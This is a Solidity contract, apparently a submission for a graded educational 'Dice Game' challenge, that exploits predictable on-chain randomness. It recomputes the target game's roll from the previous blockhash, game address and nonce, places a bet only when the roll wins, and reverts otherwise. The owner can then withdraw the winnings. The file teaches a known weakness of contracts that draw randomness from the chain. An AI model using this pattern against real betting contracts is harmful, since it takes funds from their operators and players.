pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    // errors
    error itDoesntWin();

    DiceGame public diceGame;
    uint256 public currentNonce;

    event Received(address, uint256);

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    function deposit() public payable {
        emit Received(msg.sender, msg.value);
    }

    function riggedRoll() public {
        require(address(this).balance >= .002 ether, "Not enough balance");

        currentNonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), currentNonce));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "   Rigged Roll:", roll);

        if (roll <= 5) {
            diceGame.rollTheDice{ value: 0.002 ether }();
        } else {
            revert itDoesntWin();
        }
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Insufficient balance");
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    } 
}
